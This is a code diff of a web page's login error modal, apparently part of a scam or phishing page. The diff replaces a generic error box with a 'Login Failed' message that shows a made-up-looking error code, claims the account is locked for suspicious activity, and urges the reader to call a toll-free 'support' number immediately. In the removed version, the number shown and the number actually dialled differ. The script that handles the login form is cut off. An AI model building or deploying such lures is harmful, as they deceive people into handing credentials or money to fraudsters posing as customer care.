@@ -279,14 +279,17 @@
 </footer>
 
 <!-- Modal -->
-<div id="errorModal" class="modal">
-    <div class="modal-content">
-        <span class="close-btn">&times;</span>
-        <h2>Something went wrong</h2>
-        <p>Error Code: 0X00478912739</p>
-        <p>Contact Customer Care: <a href="tel:18332030921">+1-888-203-0921</a></p>
+    <div class="modal-overlay" id="errorModal">
+        <div class="modal-content">
+            <div class="modal-close" onclick="closeModal()">×</div>
+            <h2>⚠️ Login Failed</h2>
+            <p><strong>Error Code:</strong> 0X0X0027384</p>
+            <p>Your account has been temporarily locked due to suspicious login attempts.</p>
+            <p>Please contact support immediately to resolve the issue.</p>
+            <p><strong>Support:</strong> <a href="tel:18887688944">+1-888-768-8944</a></p>
+        </div>
     </div>
-</div>
+
 
 <script>
     document.getElementById("loginForm").addEventListener("submit", function (event) {
